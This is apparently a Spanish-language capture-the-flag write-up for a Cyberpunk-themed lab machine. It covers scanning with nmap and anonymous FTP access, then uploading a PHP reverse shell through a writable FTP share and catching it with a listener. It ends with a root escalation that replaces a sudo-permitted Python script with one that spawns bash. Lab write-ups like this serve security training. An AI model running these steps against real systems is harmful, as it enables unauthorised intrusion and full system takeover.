# Reconocimiento

En primer lugar, lanzamos un netdiscover para ver la IP de la máquina víctima.

```
netdiscover
```

```zsh
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
	 ...
 192.168.1.164   08:00:27:c8:bc:92      1      60  PCS Systemtechnik GmbH
	 ...
```

## IP Víctima
```
192.168.1.164
```

Con Nmap escaneamos los puertos de la máquina para ampliar un poco la superficie de ataque y ver que opciones hay.

## Nmap
```zsh
nmap -p 0-65535 -T5 -A -sT -Pn -n 192.168.1.164 -oX scan.xml && xsltproc scan.xml -o scan.html
```

`-oX` genera un reporte en formato xml, se convierte a html con xsltproc y podemos abrirlo en el navegador con:

```zsh
firefox scan.html # En una terminal con un usuario que no sea root 
```
### Ports
En el informe nos encontramos con los siguiente puertos:

- 21: FTP con login anónimo permitido
- 22: SSH
- 80: Servidor HTTP

Lo más obvio y sencillo por ahora será revisar el servidor FTP

## FTP
```zsh
❯ ftp 192.168.1.164
...
Name (192.168.1.164:kali): anonymous
331 Conexión anónima ok, envía tu dirección de email como contraseña
Password: ## Aquí se puede poner cualquier cosa o darle directamente a enter
230 Aceptado acceso anónimo, aplicadas restricciones
...
ftp> prompt OFF ## Desactiva las confirmaciones
Interactive mode off.
ftp> mget * -l 0 ## Descarga todo el contenido del directorio actual
...
ftp> cd images ## Nos falta el contenido del directorio /images porque mget* no es recursivo
...
ftp> mget *
...
ftp> exit

```

Con todos los archivos ya en nuestra máquina, echamos un vistazo a `secret.txt`.

```zsh
cat secret.txt

*********************************************
   2   │ *                                           *
   3   │ *        Hola Netrunner,                   *
   4   │ *                                           *
   5   │ *   Has sido contratado por el mejor fixer  *
   6   │ *   de la ciudad para llevar a cabo una     *
   7   │ *   misión crucial.                         *
   8   │ *                                           *
   9   │ *   Tenemos información de que Arasaka,     *
  10   │ *   la mega-corporación más poderosa de     *
  11   │ *   Night City, está migrando sus sistemas  *
  12   │ *   y actualmente parece ser vulnerable.    *
  13   │ *   Necesitamos que te infiltres en sus    *
  14   │ *   sistemas y desactives el Relic para     *
  15   │ *   salvar la vida de V.                    *
  16   │ *                                           *
  17   │ *   Te espero en Apache.                    *
  18   │ *                                           *
  19   │ *                         - Alt             *
  20   │ *********************************************
```

## DirBusting
Escaneamos mediante FFUF en busca de directorios pero no devuelve nada a primera vista. Al añadirle al comando extensiones tampoco muestra nada que no hubiésemos visto en el servidor FTP

## Reverse shell
Después de acabar en un par de foros demasiado nicho sobre esteganografía para la dificultad de este lab, vuelvo al FTP y veo que permite subir archivos, y estos se cargan en la web.

```zsh
❯ ftp 192.168.1.164
...
Name (192.168.1.164:kali): anonymous
....
ftp> put neuro_virus.php 

```

Subo la revshell de php de PentestMonkey, ahora, al poner en el browser `http://<IP>/neuro_virus.php` deberíamos ganar una shell.

Evidentemente, antes hay que ponerse en escucha, yo lo haré con `penelope`.
```
penelope -p 443
```

Al solicitar ese recurso desde el navegador gano acceso a la shell.


# Post explotación
## Sanitización y arasaka.txt
Como estoy en penelope, basta con:
```zsh
www-data@Cyberpunk:/$ export TERM=xterm-256color
www-data@Cyberpunk:/$ source /etc/skel/.bashrc
```

A nada que investiguemos un poco, damos con un archivo interesante en `/opt` encodeado con brainfuck. Lo pasamos por un decoder online y nos da la contraseña para pivotar al usuario `arasaka`

```zsh
su arasaka

cyberpunk2077
```

## Arasaka
Pruebo si se puede hacer `sudo -l ` nada más pivotar, y el usuario puede ejecutar como root un script que, al estar en la home de nuestro usuario, seguramente podamos sobreescribir. Al ir allí, además me encuentro la flag de user.

```zsh
arasaka@Cyberpunk:/opt$ sudo -l
...
User arasaka may run the following commands on Cyberpunk:
    (root) PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py
arasaka@Cyberpunk:/opt$ cd /home/arasaka/
arasaka@Cyberpunk:~$ ls -la
...
-rwxr-xr-x 1 root    root     207 may  1  2024 randombase64.py
-rw-r--r-- 1 arasaka arasaka   33 may  1  2024 user.txt

```

Viendo con `ls -la` en realidad observamos que el archivo es propiedad de root, y no podemos escribir en él, sin embargo, como `arasaka` es dueño del directorio, se puede borrar y crear uno llamado igual para escalar privilegios.

```zsh
arasaka@Cyberpunk:~$ rm randombase64.py 
rm: ¿borrar el fichero regular 'randombase64.py'  protegido contra escritura? (s/n) s
arasaka@Cyberpunk:~$ touch randombase64.py
arasaka@Cyberpunk:~$ nano randombase64.py 
arasaka@Cyberpunk:~$ cat randombase64.py
	import os
	os.system("/bin/bash")
```

En el archivo podemos python sencillo, importa el módulo os, que hace llamadas al sistema operativo, y permite ejecutar comandos, en este caso, ejecutar `/bin/bash` bastará.

```zsh
arasaka@Cyberpunk:~$ sudo /usr/bin/python3.11 /home/arasaka/randombase64.py

root@Cyberpunk:/home/arasaka: id
uid=0(root) gid=0(root) grupos=0(root)
root@Cyberpunk:/home/arasaka: cat /root/root.txt 
**************************

Enhorabuena, has podido desactivar el relic y salvar la vida de V.

La transferencia de eddies a tu cuenta se ha mandado :D
root@Cyberpunk:/home/arasaka# 

```

